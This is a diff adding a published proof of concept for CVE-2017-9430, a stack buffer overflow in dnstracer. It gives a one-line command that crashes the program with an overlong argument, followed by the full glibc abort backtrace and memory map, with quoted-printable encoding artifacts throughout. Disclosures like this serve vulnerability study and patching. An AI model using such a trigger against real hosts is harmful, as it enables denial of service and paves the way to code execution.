@@ -1,0 +1,73 @@
+################
+#Exploit Title: DNSTracer Stack-based Buffer Overflow
+#CVE: CVE-2017-9430
+#CWE: CWE-119
+#Exploit Author: Hosein Askari (FarazPajohan)
+#Vendor HomePage: http://www.mavetju.org
+#Version : 1.8.1
+#Tested on: Parrot OS
+#Date: 04-06-2017
+#Category: Application
+#Author Mail : hosein.askari@aol.com
+#Description:  Stack-based buffer overflow in dnstracer through 1.9 allows =
+attackers  to cause a denial of service (application crash) or possibly hav=
+e unspecified other impact via a command line with a long name argument tha=
+t is mishandled in a strcpy call for argv[0]. An example threat model is a =
+web application that launches dnstracer with an untrusted name string.
+###############################
+
+#dnstracer -v $(python -c 'print "A"*1025')
+*** buffer overflow detected ***: dnstracer terminated
+=3D=3D=3D=3D=3D=3D=3D Backtrace: =3D=3D=3D=3D=3D=3D=3D=3D=3D
+/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7ff6e79edbcb]
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ff6e7a76037]
+/lib/x86_64-linux-gnu/libc.so.6(+0xf7170)[0x7ff6e7a74170]
+/lib/x86_64-linux-gnu/libc.so.6(+0xf64d2)[0x7ff6e7a734d2]
+dnstracer(+0x2c8f)[0x5634368aac8f]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7ff6e799d2b1]
+dnstracer(+0x2fca)[0x5634368aafca]
+=3D=3D=3D=3D=3D=3D=3D Memory map: =3D=3D=3D=3D=3D=3D=3D=3D
+5634368a8000-5634368b0000 r-xp 00000000 08:01 4850311                    /u=
+sr/bin/dnstracer
+563436aaf000-563436ab0000 r--p 00007000 08:01 4850311                    /u=
+sr/bin/dnstracer
+563436ab0000-563436ab1000 rw-p 00008000 08:01 4850311                    /u=
+sr/bin/dnstracer
+563436ab1000-563436ab3000 rw-p 00000000 00:00 0=20
+563436c1d000-563436c3e000 rw-p 00000000 00:00 0                          [h=
+eap]
+7ff6e7766000-7ff6e777c000 r-xp 00000000 08:01 25823192                   /l=
+ib/x86_64-linux-gnu/libgcc_s.so.1
+7ff6e777c000-7ff6e797b000 ---p 00016000 08:01 25823192                   /l=
+ib/x86_64-linux-gnu/libgcc_s.so.1
+7ff6e797b000-7ff6e797c000 r--p 00015000 08:01 25823192                   /l=
+ib/x86_64-linux-gnu/libgcc_s.so.1
+7ff6e797c000-7ff6e797d000 rw-p 00016000 08:01 25823192                   /l=
+ib/x86_64-linux-gnu/libgcc_s.so.1
+7ff6e797d000-7ff6e7b12000 r-xp 00000000 08:01 25823976                   /l=
+ib/x86_64-linux-gnu/libc-2.24.so
+7ff6e7b12000-7ff6e7d11000 ---p 00195000 08:01 25823976                   /l=
+ib/x86_64-linux-gnu/libc-2.24.so
+7ff6e7d11000-7ff6e7d15000 r--p 00194000 08:01 25823976                   /l=
+ib/x86_64-linux-gnu/libc-2.24.so
+7ff6e7d15000-7ff6e7d17000 rw-p 00198000 08:01 25823976                   /l=
+ib/x86_64-linux-gnu/libc-2.24.so
+7ff6e7d17000-7ff6e7d1b000 rw-p 00000000 00:00 0=20
+7ff6e7d1b000-7ff6e7d3e000 r-xp 00000000 08:01 25823455                   /l=
+ib/x86_64-linux-gnu/ld-2.24.so
+7ff6e7f13000-7ff6e7f15000 rw-p 00000000 00:00 0=20
+7ff6e7f3a000-7ff6e7f3e000 rw-p 00000000 00:00 0=20
+7ff6e7f3e000-7ff6e7f3f000 r--p 00023000 08:01 25823455                   /l=
+ib/x86_64-linux-gnu/ld-2.24.so
+7ff6e7f3f000-7ff6e7f40000 rw-p 00024000 08:01 25823455                   /l=
+ib/x86_64-linux-gnu/ld-2.24.so
+7ff6e7f40000-7ff6e7f41000 rw-p 00000000 00:00 0=20
+7ffded62d000-7ffded64e000 rw-p 00000000 00:00 0                          [s=
+tack]
+7ffded767000-7ffded769000 r--p 00000000 00:00 0                          [v=
+var]
+7ffded769000-7ffded76b000 r-xp 00000000 00:00 0                          [v=
+dso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [v=
+syscall]
+Aborted
